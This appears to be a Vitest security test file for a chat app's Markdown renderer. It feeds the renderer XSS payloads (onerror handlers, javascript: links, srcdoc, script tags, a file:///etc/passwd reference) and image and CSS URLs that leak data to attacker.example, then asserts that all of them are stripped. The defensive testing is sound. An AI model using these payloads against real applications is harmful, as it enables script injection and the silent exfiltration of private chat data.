import { createMarkdownParser } from '@comark/nuxt/parse'
import { visit } from '@comark/nuxt/utils'
import { MarkdownDocument } from '@comark/vue'
import { describe, expect, test } from 'vitest'
import { createSSRApp, defineComponent, h } from 'vue'
import { renderToString } from 'vue/server-renderer'
import { chatMarkdownOptions } from '@keundal/ui/app/utils/markdown.ts'
import { sourceToInlineMdc } from '../app/lib/source'

async function render(markdown: string, streaming = false) {
  const parse = createMarkdownParser(chatMarkdownOptions)
  const document = await parse(markdown, { streaming })
  expectSafeDocument(document)
  return renderToString(createSSRApp(MarkdownDocument, { value: document, streaming }))
}

function expectSafeDocument(document: Awaited<ReturnType<ReturnType<typeof createMarkdownParser>>>) {
  visit(document, node => Array.isArray(node), (node) => {
    if (typeof node === 'string') return
    for (const key of Object.keys(node[1])) {
      expect(key).not.toMatch(/^(?:on|@|v-on:|:|v-bind|as$|is$|to$|copy$|srcdoc$|formaction$|innerhtml$)/i)
    }
  })
}

const payloads = [
  '<img src=x onerror="alert(1)">',
  '<img src=x OnLoAd="alert(1)">',
  ':img{src="x" onerror="alert(1)"}',
  ':img{src="x" @error="alert(1)"}',
  ':img{src="x" v-on:error="alert(1)"}',
  ':img{src="x" :onerror="\'alert(1)\'"}',
  '[link](https://example.com){onclick="alert(1)"}',
  '[link](https://example.com){to="javascript:alert(1)"}',
  ':a{to="javascript:alert(1)"}',
  ':pre{copy=\'{"to":"javascript:alert(1)"}\'}',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="data:text/html,<script>alert(1)</script>"></object>',
  '<embed src="data:text/html,<script>alert(1)</script>">',
  '<script>alert(1)</script>',
  '<style>body{display:none}</style>',
  '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
  '<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">x</button></form>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="java&#x73;cript:alert(1)">x</a>',
  '<a href="java&#9;script:alert(1)">x</a>',
  ':a{href="javascript:alert(1)"}',
  ':img{src="data:image/svg+xml,<svg onload=alert(1)></svg>"}',
  ':div{as="iframe" srcdoc="<script>alert(1)</script>"}',
  ':p{:as="\'script\'"}',
  '---\nurl: file:///etc/passwd\n---\n:a{:href="frontmatter.url"}',
  ':u-button{to="javascript:alert(1)"}',
  ':component{is="script"}'
]

describe('공통 채팅 Markdown 렌더러의 보안 경계', () => {
  test.each(payloads)('완료 및 스트리밍 렌더링에서 활성 콘텐츠를 제거한다: %s', async (payload) => {
    for (const streaming of [false, true]) {
      const html = await render(payload, streaming)
      expect(html).not.toMatch(/\s(?:on\w+|srcdoc|formaction)\s*=/i)
      expect(html).not.toMatch(/<(?:script|style|iframe|object|embed|svg|form|button|u-button|component)\b/i)
      expect(html).not.toMatch(/(?:href|src)="(?:javascript:|data:)/i)
      expect(html).not.toContain('as="iframe"')
      expect(html).not.toMatch(/\s(?:as|is)\s*=/i)
      expect(html).not.toContain('href="file:')
    }
  })

  test('연속된 스트리밍 조각과 저장 후 다시 파싱한 메시지도 정화한다', async () => {
    const parse = createMarkdownParser(chatMarkdownOptions)
    const payload = 'safe\n\n<img src=x onerror="alert(1)">\n\n**done**'
    for (const end of [8, 18, 30, payload.length]) {
      const document = await parse(payload.slice(0, end), { streaming: true })
      expectSafeDocument(document)
      const html = await renderToString(createSSRApp(MarkdownDocument, { value: document }))
      expect(html).not.toMatch(/\sonerror\s*=/i)
    }
    expect(await render(JSON.parse(JSON.stringify(payload)))).not.toMatch(/\sonerror\s*=/i)
  })

  test('정상 Markdown과 안전한 HTML 및 코드 강조를 유지한다', async () => {
    const html = await render('# Title\n\n**bold** <em>safe</em> [link](https://example.com)\n\n- [x] done\n\n```js\nconst x = 1\n```')
    expect(html).toContain('<h1')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<em>safe</em>')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('type="checkbox"')
    expect(html).toContain('disabled')
    expect(html).toContain('<pre')
    expect(html).toContain('shiki')
    expect(html).toContain('<span style=')
  })

  test('생성된 출처 링크는 허용된 컴포넌트와 속성으로 전달한다', async () => {
    const parse = createMarkdownParser(chatMarkdownOptions)
    const document = await parse(sourceToInlineMdc('https://example.com/source'))
    const SourceLink = defineComponent({
      inheritAttrs: false,
      props: ['url', 'label', 'favicon'],
      setup: props => () => h('a', { href: props.url }, props.label)
    })
    const html = await renderToString(createSSRApp(MarkdownDocument, {
      value: document, components: { 'source-link': SourceLink }
    }))
    expect(html).toContain('href="https://example.com/source"')
    expect(html).toContain('example.com')
  })
})

const networkPayloads = [
  '![private context](https://attacker.example/leak?secret=1)',
  '<img src="http://127.0.0.1/private">',
  ':img{src="https://attacker.example/leak"}',
  '<div style="background-image:url(https://attacker.example/css)">text</div>',
  ':span{style="cursor:url(https://attacker.example/cursor),auto"}',
  ':source-link{url="https://example.com" favicon="https://attacker.example/favicon" label="source"}'
]

test.each(networkPayloads)('완료·스트리밍·저장된 Markdown은 자동 요청 속성을 만들지 않는다: %s', async (payload) => {
  for (const streaming of [false, true]) {
    const html = await render(JSON.parse(JSON.stringify(payload)), streaming)
    expect(html).not.toMatch(/<(?:img|iframe|video|audio|source|link)(?:\s|>)/i)
    expect(html).not.toMatch(/\s(?:src|srcset|favicon)=/i)
    expect(html).not.toMatch(/style="[^"]*(?:url|image-set)\s*\(/i)
  }
})

test('완료된 코드 블록을 재사용하는 스트리밍에서도 강조 색과 이미지의 클릭 링크를 유지한다', async () => {
  const parse = createMarkdownParser(chatMarkdownOptions)
  for (const suffix of ['', '\n\nnext', '\n\nnext paragraph']) {
    const document = await parse('```python\n# comment\nprint("safe")\n```\n\n![picture](https://example.com/a.png)' + suffix, { streaming: true })
    const html = await renderToString(createSSRApp(MarkdownDocument, { value: document }))
    expect(html).toContain('<span style=')
    expect(html).toContain('--shiki-dark-font-style:italic')
    expect(html).toContain('href="https://example.com/a.png"')
    expect(html).toContain('picture')
    expect(html).not.toContain('<img')
  }
})
